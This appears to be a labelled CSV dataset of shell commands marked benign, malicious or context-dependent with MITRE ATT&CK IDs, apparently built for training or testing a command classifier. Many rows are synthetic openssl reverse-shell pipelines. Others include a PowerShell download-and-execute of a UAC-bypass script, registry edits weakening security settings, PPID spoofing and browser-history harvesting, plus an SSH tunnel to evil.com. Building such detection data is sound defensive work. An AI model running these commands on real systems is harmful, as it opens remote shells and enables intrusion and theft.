command,label,original_label,mitre_id
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:80,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:9090 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
"echo -n ""Hello"" | od -A n -t x1",Benign,Benign,Benign
shpool detach session_name,Benign,Benign,Benign
sw_vers -buildVersion,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.10:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:995 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:4445,Malicious,Synthetic,Synthetic
shnsplit -f path/to/file.cue -o flac path/to/file.flac,Benign,Benign,Benign
ng update package,Benign,Benign,Benign
mpstat 2 5,Benign,Benign,Benign
stat /etc/environment,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:53,Malicious,Synthetic,Synthetic
dnf builddep --skip-unavailable path/to/specification.spec,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:3389,Malicious,Synthetic,Synthetic
mimetype --all path/to/file,Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.10:80 operator@192.168.1.1,Context_Dependent,Synthetic,Synthetic
"echo -e ""red\ngreen\nblue"" | fuzzel [-d|--dmenu] > color.txt",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:22 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
chsh -s /bin/sh art,Malicious,Malicious,T1059
true,Benign,Benign,Benign
winrm,Malicious,Malicious,T1021
openssl s_client -quiet -connect 192.168.1.1:443 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
xcodebuild -workspace workspace_name.workspace -scheme scheme_name -configuration configuration_name clean build SYMROOT=SYMROOT_path,Benign,Benign,Benign
"Add-Content -Path ""C:\Windows\System32\termsrv.dll"" -Value ""`n"" -NoNewline -ErrorAction Ignore",Malicious,Malicious,T1505
openssl s_client -quiet -connect 192.168.1.254:110 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
sips --deleteProperty profile --deleteColorManagementProperties path/to/image_file.ext,Benign,Benign,Benign
rm foo,Benign,Benign,Benign
hddtemp [-S|--syslog] nseconds type:/dev/sdX,Benign,Benign,Benign
tldr find,Benign,Benign,Benign
dvc init --no-scm,Benign,Benign,Benign
gst-launch-1.0 [-e|--eos-on-shutdown] pipewiresrc ! opusenc ! oggmux ! filesink location=path/to/file.ogg,Benign,Benign,Benign
tcpdump -i eth0 dst 10.0.0.5,Context_Dependent,Synthetic,Synthetic
if ($tcp.Connected) {,Context_Dependent,Malicious,T1046
openssl s_client -quiet -connect 192.168.1.100:3306 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
docker inspect container|image|ID,Context_Dependent,Benign,Benign
ssh -w 0:0 postgres@staging.lab,Context_Dependent,Synthetic,Synthetic
"rundll32.exe dfshim.dll,ShOpenVerbApplication1",Malicious,Malicious,T1127
find . -name something -print -quit,Benign,Benign,Benign
ssh -fN -L 8080:192.168.0.5:80 user@192.168.1.1,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:22,Malicious,Synthetic,Synthetic
dget package,Benign,Benign,Benign
"elasticsearch-croneval ""cron_expression""",Benign,Benign,Benign
cat /etc/*release | uniq,Context_Dependent,Malicious,T1082
ssh -fN -L 8080:10.0.0.10:110 operator@172.16.0.25,Context_Dependent,Synthetic,Synthetic
stat /etc/login.defs,Context_Dependent,Synthetic,Synthetic
GetBucketAcl,Context_Dependent,Malicious,T1069
openssl s_client -quiet -connect 192.168.1.100:8443 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:4445,Malicious,Synthetic,Synthetic
lstopo-no-graphics [-h|--help],Benign,Benign,Benign
transcode -Z 640x480 -i input_file -y xvid -o output_file,Benign,Benign,Benign
sudo dscl . -create /Users/$user_name UniqueID 333,Malicious,Malicious,T1564
openssl s_client -quiet -connect 192.168.1.25:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3389,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:1433,Malicious,Synthetic,Synthetic
tcpdump -i wlan0 -w /tmp/capture.pcap,Context_Dependent,Synthetic,Synthetic
env_auth = true,Malicious,Malicious,T1567
openssl s_client -quiet -connect 192.168.1.254:5432 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
"find temp/medium/* -maxdepth 2 -iname ""*.jpg"" -print0 | xargs -0 mogrify -resize 428x270"">"" -quality 80 -compress JPEG -monitor -strip",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:995,Malicious,Synthetic,Synthetic
yamllint [-h|--help],Benign,Benign,Benign
mvn clean site,Benign,Benign,Benign
sshuttle -r backup@assets-dropper.net 10.0.0.10/24,Context_Dependent,Synthetic,Synthetic
"find / -path ""*.mozilla/firefox/*/places.sqlite"" 2>/dev/null -exec echo {} >> $output_file \;",Context_Dependent,Malicious,T1217
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:22,Malicious,Synthetic,Synthetic
logcat --pid $(pidof -s package),Benign,Benign,Benign
pamtowinicon path/to/input_file.pam > path/to/output.ico,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8443,Malicious,Synthetic,Synthetic
rabbitmq-upgrade drain,Benign,Benign,Benign
Projucer --help,Benign,Benign,Benign
dolt status,Benign,Benign,Benign
find * /home/www -type f,Benign,Benign,Benign
dnsrecon [-d|--domain] example.com -s [-j|--json],Benign,Benign,Benign
go fmt path/to/package,Benign,Benign,Benign
Move-Item path\to\source path\to\target,Benign,Benign,Benign
tcpdump -i eth0 -w /tmp/.hidden,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.1:3306 postgres@10.0.0.5,Context_Dependent,Synthetic,Synthetic
split -n 1000000 /etc/gconf/schemas/gnome-terminal.schemas,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9001,Malicious,Synthetic,Synthetic
plutil -p file1.plist file2.plist ...,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9090 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
doppler projects delete name|project_id,Benign,Benign,Benign
rustup show,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:995,Malicious,Synthetic,Synthetic
nemo --geometry=600x400 path/to/directory,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:3306 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:9002,Malicious,Synthetic,Synthetic
wmctrl -s workspace_number,Benign,Benign,Benign
sngrep -NO path/to/file.pcap,Benign,Benign,Benign
tcpdump -i ens160 -w /tmp/.hidden,Context_Dependent,Synthetic,Synthetic
ip [m|maddress] [s|show] dev ethX,Benign,Benign,Benign
tcpdump -i eth0 host 172.16.0.25,Context_Dependent,Synthetic,Synthetic
find . -size +1000k -name *.log -print0 | xargs -0 ls –lSh,Benign,Benign,Benign
crane digest [-h|--help],Benign,Benign,Benign
aspell dicts,Benign,Benign,Benign
CallWindowProc,Malicious,Malicious,T1106
openssl s_client -quiet -connect 192.168.1.10:5432 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
cd $(readlink -f $(dirname $0)),Benign,Benign,Benign
pg_amcheck [-a|--all],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:53 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
tcpdump -i wlan0 -c 8888,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:22,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:22 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
nyxt --list-data-profiles,Benign,Benign,Benign
kool run script,Benign,Benign,Benign
cat /etc/passwd |grep nobody,Malicious,Malicious,T1078
"Rename-Item -Path ""path\to\file"" -NewName ""path\to\new_file_name""",Benign,Benign,Benign
idevicecrashreport --extract path/to/directory,Benign,Benign,Benign
pydocstyle --convention pep257|numpy|google file.py|path/to/directory,Benign,Benign,Benign
tcpdump -i ens33 -w /tmp/.cache,Context_Dependent,Synthetic,Synthetic
"ssh -n -f user@host ""sh -c 'cd /whereever; nohup ./whatever > /dev/null 2>&1 &'""",Benign,Benign,Benign
top -bn1 -o %CPU | head -20,Context_Dependent,Synthetic,Synthetic
"echo ""password"" | argon2 ""salt_text"" -d|i|id",Benign,Benign,Benign
ffplay path/to/file,Benign,Benign,Benign
tcpdump -i eth0 host 10.0.0.8,Context_Dependent,Synthetic,Synthetic
"Powershell.exe ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'""",Malicious,Malicious,T1059
vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:,Malicious,Malicious,T1202
find debian/fglrx/ -name 'fglrx-libGL*',Benign,Benign,Benign
pmap pid,Benign,Benign,Benign
/etc/rc.local.d/local.sh,Malicious,Malicious,T1564
direnv allow .,Benign,Benign,Benign
ipaggmanip [-P|--posterize] path/to/file,Benign,Benign,Benign
Register-cimprovider -path {PATH_ABSOLUTE:.dll},Malicious,Malicious,T1218
"find data/ -name ""filepattern-*2009*"" | cpio -ov --format=ustar > 2009.tar",Benign,Benign,Benign
spottopgm path/to/file.spot > path/to/output.pgm,Benign,Benign,Benign
flex analyzer.l,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.10:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:110 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
crictl rmi image_id1 image_id2 ...,Benign,Benign,Benign
aapt list path/to/app.apk,Benign,Benign,Benign
last username,Context_Dependent,Benign,Benign
find /foldername | sort -n | tail -1,Benign,Benign,Benign
systemctl kexec [-f|--force],Benign,Benign,Benign
cleanmgr /autoclean,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:1433,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:6379,Malicious,Synthetic,Synthetic
psalm --threads 4,Benign,Benign,Benign
tmt try rhel-9,Benign,Benign,Benign
ipcs [-l|--limits] --bytes|--human,Benign,Benign,Benign
"echo -e ""Column 1\tColumn 2""",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:3306,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:6379,Malicious,Synthetic,Synthetic
patool search path/to/archive,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:993,Malicious,Synthetic,Synthetic
kcat -L -t topic -b brokers,Benign,Benign,Benign
SafeEjectGPU gpuid GPU_ID status,Benign,Benign,Benign
neofetch --os_arch on|off,Benign,Benign,Benign
systemd-mount --automount yes path/to/file_or_device,Benign,Benign,Benign
jsc.exe /t:library {PATH:.js},Malicious,Malicious,T1127
most path/to/file,Benign,Benign,Benign
frida [-c|--codeshare] script_name process_name,Benign,Benign,Benign
btop [-p|--preset] 0..9,Benign,Benign,Benign
trizen -Qe,Benign,Benign,Benign
valet link application_name,Benign,Benign,Benign
"dolt commit --author ""author_name <author_email>""",Benign,Benign,Benign
systemctl whoami --user,Benign,Benign,Benign
"Query=""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325""};",Malicious,Malicious,T1546
wermgr.exe,Malicious,Malicious,T1055
tldr mpic++,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:110,Malicious,Synthetic,Synthetic
coproc name { command1; command2; ...; },Benign,Benign,Benign
Get-History -Count n,Benign,Benign,Benign
openttd -r 1920x1080,Benign,Benign,Benign
tcpdump -i eth0 dst 10.10.10.25,Context_Dependent,Synthetic,Synthetic
pie repository:remove url,Benign,Benign,Benign
magento setup:di:compile,Benign,Benign,Benign
"pio test [-f|--filter] ""pattern""",Benign,Benign,Benign
ctop -h,Benign,Benign,Benign
crackle -i path/to/input.pcap,Benign,Benign,Benign
bun audit --prod,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:1433 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.8:445 deploy@ops-audit.internal,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:9002,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.10.10.50:1433 backup@ops-audit.internal,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:3389,Malicious,Synthetic,Synthetic
set file=$output_file_path\user_info_%random%.tmp,Context_Dependent,Malicious,T1033
openssl s_client -quiet -connect 192.168.1.1:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:443,Malicious,Synthetic,Synthetic
psgrep -s process_name,Benign,Benign,Benign
cargo metadata --no-deps,Benign,Benign,Benign
timedatectl,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:22,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.25:143 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
yes $1 | head -$number,Benign,Benign,Benign
ssh -fN -L 8080:10.10.10.50:4444 deploy@192.168.1.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:8081,Malicious,Synthetic,Synthetic
a2ping --extra arguments path/to/file,Benign,Benign,Benign
tldr Set-Clipboard,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:995,Malicious,Synthetic,Synthetic
now remove deployment_id,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
strace -e trace=file -p 53,Context_Dependent,Synthetic,Synthetic
tcpdump -i eth0 src 10.10.10.10,Context_Dependent,Synthetic,Synthetic
qtcreator -noload all,Benign,Benign,Benign
paste /path/to/input-file,Context_Dependent,Malicious,T1005
pw-jack -h,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.25:143,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.10.10.50:9001 user@192.168.0.5,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:10.10.10.25:443 user@10.10.10.50,Context_Dependent,Synthetic,Synthetic
ncspot [-c|--config] file_name,Benign,Benign,Benign
pkl eval module.pkl,Benign,Benign,Benign
find ./ -type f -size 0c -print | xargs rm,Benign,Benign,Benign
lwp-request -C username:password -m METHOD http://example.com/some/path,Benign,Benign,Benign
aws amplify delete-backend-environment --app-id app_id --environment-name env_name,Benign,Benign,Benign
runcon user_u:role_r:domain_t command,Benign,Benign,Benign
ipython locate profile,Benign,Benign,Benign
pprof ./fibbo ./fibbo-profile.pb.gz,Benign,Benign,Benign
komac update Package.Identifier [-v|--version] 1.2.3 [-u|--urls] https://example.com/app.exe https://example.com/app.msi ... [-s|--submit],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8888,Malicious,Synthetic,Synthetic
sshuttle -r jenkins@192.168.0.50 10.0.0.0/24,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:5432 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8888,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:80 | /bin/bash | openssl s_client -quiet -connect 172.16.5.20:9002,Malicious,Synthetic,Synthetic
tcpdump -i eth0 src 10.0.0.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:53,Malicious,Synthetic,Synthetic
bcomps -?,Benign,Benign,Benign
mpd,Benign,Benign,Benign
cmd path\to\script.bat,Benign,Benign,Benign
checkupdates [-n|--nosync],Benign,Benign,Benign
RASSFM.DLL,Malicious,Malicious,T1556
ssh -fN -L 8080:172.16.0.25:80 postgres@files.company.local,Context_Dependent,Synthetic,Synthetic
ffmpeg -i path/to/video.mp4 -vn path/to/sound.mp3,Benign,Benign,Benign
HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest,Malicious,Malicious,T1112
gsettings list-recursively org.example.schema,Benign,Benign,Benign
find . -name \*.txt -exec process {} +,Benign,Benign,Benign
prstat,Benign,Benign,Benign
gh secret [ls|list],Benign,Benign,Benign
ydotool click 0xC0,Benign,Benign,Benign
sfdk qmake project,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:5432,Malicious,Synthetic,Synthetic
ptyxis [-x|--execute] command,Benign,Benign,Benign
"ani-cli [-v|--vlc] ""anime_title""",Benign,Benign,Benign
find . -type f -exec perl -i -pe 's/something/another/g' {} \;,Benign,Benign,Benign
find / -type c,Context_Dependent,Benign,Benign
traceroute -n 10.0.0.1,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:445,Malicious,Synthetic,Synthetic
strace -e trace=network -p 80,Context_Dependent,Synthetic,Synthetic
kill $(ps aux | grep '[p]ython csp_build.py' | awk '{print $2}'),Benign,Benign,Benign
waypipe ssh user@server,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:8443,Malicious,Synthetic,Synthetic
systemctl enable $systemd_service_file,Malicious,Malicious,T1543
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.10:6379,Malicious,Synthetic,Synthetic
systemd-creds decrypt path/to/input_file path/to/output_file,Benign,Benign,Benign
mac2unix path/to/file,Benign,Benign,Benign
ppmtv dim_factor path/to/file.ppm > path/to/output.ppm,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8888 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8443 | /bin/bash | openssl s_client -quiet -connect 172.16.0.10:8081,Malicious,Synthetic,Synthetic
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"" /v ""DoNotConnectToWindowsUpdateInternetLocations"" /t REG_DWORD /d 1 /f",Malicious,Malicious,T1112
tcpdump -i eth0 host 192.168.1.25,Context_Dependent,Synthetic,Synthetic
objcopy --strip-debug path/to/source_file path/to/target_file,Benign,Benign,Benign
highlight [-o|--out-format] html [-s|--style] theme_name [-S|--syntax] language path/to/source_code,Benign,Benign,Benign
limactl shell vm_name,Benign,Benign,Benign
cs java -version,Benign,Benign,Benign
pipwin uninstall package,Benign,Benign,Benign
sudo update-alternatives --remove java /opt/java/jdk1.8.0_102/bin/java,Benign,Benign,Benign
Crash,Malicious,Malicious,T1218
tldr pamdepth,Benign,Benign,Benign
"sync --list-only --include ""*2012*.xml"" -exclude ""*.xml"" serveripaddress::pt/dir/files/ --port=111 | awk '{ $1=$2=$3=$4=""""; print substr($0,5); }' >output.txt",Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.5:9090 user@10.10.10.50,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:9001,Malicious,Synthetic,Synthetic
"echo ""text"" | espeak-ng",Benign,Benign,Benign
ndctl list -vvv --namespace=namespaceX.Y,Benign,Benign,Benign
fonttools --help,Benign,Benign,Benign
dwebp path/to/input.webp -o path/to/output.png -mt,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.25:443 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.100:8443 user@172.20.10.8,Context_Dependent,Synthetic,Synthetic
"find ""$topdir"" -name '*.py' -printf '%h\0' | xargs -0 -I {} find {} -mindepth 1 -maxdepth 1 -name Makefile -printf '%h\n' | sort -u",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:5432 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:22 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
yes n | gunzip file*.gz,Benign,Benign,Benign
git imerge diagram,Benign,Benign,Benign
ssh -fN -L 8080:192.168.0.5:9001 jenkins@evil.com,Context_Dependent,Synthetic,Synthetic
"sudo xfs_admin [-L|--Label] ""label"" /dev/sdX",Benign,Benign,Benign
mg -n path/to/file,Benign,Benign,Benign
transmission-create [-o|--outfile] path/to/example.torrent [-t|--tracker] tracker_url1 [-c|--comment] comment path/to/file_or_directory,Benign,Benign,Benign
"PPID-Spoof -ppid $ppid -spawnto ""$spawnto_process_path"" -dllpath ""$dll_path""",Malicious,Malicious,T1134
tracepath 172.16.0.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:1433 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:3389,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:192.168.0.5:995 admin@10.0.0.10,Context_Dependent,Synthetic,Synthetic
"who | awk '{ print $1; }' | sort -u | awk '{print $1; u++} END{ print ""users: "" u}'",Context_Dependent,Benign,Benign
compseq -sequence path/to/input_rna.fasta -word 3 path/to/output_file.comp -nozero -frame 1,Benign,Benign,Benign
nm [-C|--demangle] path/to/file.o,Benign,Benign,Benign
nextclade dataset get [-n|--name] sars-cov-2 [-o|--output-dir] path/to/directory,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:53,Malicious,Synthetic,Synthetic
mount | tail -1 | sed 's/^.* on \(.*\) ([^)]*)$/\1/',Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
magick montage path/to/image1.jpg path/to/image2.jpg ... -geometry +0+0 -tile 2x3 montage_%d.jpg,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:443 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
"$env:AWS_SECRET_ACCESS_KEY = ""$awsSecretKey""",Malicious,Malicious,T1567
"find . -type f \( -name ""*.dat"" \) -exec tail -n+5 -q ""$file"" {} + |tee concat.txt",Benign,Benign,Benign
find . -type f -ctime $FTIME,Benign,Benign,Benign
"find . -name ""new*.sh""",Benign,Benign,Benign
"find . -iname ""*notes*"" | xargs grep -i mysql",Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.1:9001 user@192.168.1.10,Context_Dependent,Synthetic,Synthetic
complete -F function command,Benign,Benign,Benign
"sm ""Hello World!""",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:6379,Malicious,Synthetic,Synthetic
claude config list,Benign,Benign,Benign
atom [-a|--add] path/to/file_or_directory,Benign,Benign,Benign
"if [ -x ""$(command -v tshark)"" ]; then sudo tshark -c 5 -i $interface; fi;",Context_Dependent,Malicious,T1040
openssl s_client -quiet -connect 192.168.1.100:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.10:4445,Malicious,Synthetic,Synthetic
pnmtoxwd path/to/input_file.pnm > path/to/output_file.xwd,Benign,Benign,Benign
$xlApp.Quit(),Malicious,Malicious,T1204
sudo iotop [-p|--pid] PID,Benign,Benign,Benign
find / -uid 1005 2>/dev/null,Context_Dependent,Benign,Benign
find `pwd` -name file.ext |xargs -l1 dirname,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
ntfs-read.py -extract \windows\system32\config\sam volume,Benign,Benign,Benign
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force,Malicious,Malicious,T1548
tcpdump -i wlan0 port 110,Context_Dependent,Synthetic,Synthetic
"x8 [-u|--url] https://example.com/ [-X|--method] POST [-b|--body] '{{{""x"":{%s\}\}}}' [-w|--wordlist] path/to/wordlist.txt",Benign,Benign,Benign
", command -with -flags",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:5432,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 172.16.0.10:8081,Malicious,Synthetic,Synthetic
tmux show-environment -t sessname | grep RBENV,Benign,Benign,Benign
move path\to\source path\to\target,Benign,Benign,Benign
locate,Context_Dependent,Malicious,T1083
pushd -n +4,Benign,Benign,Benign
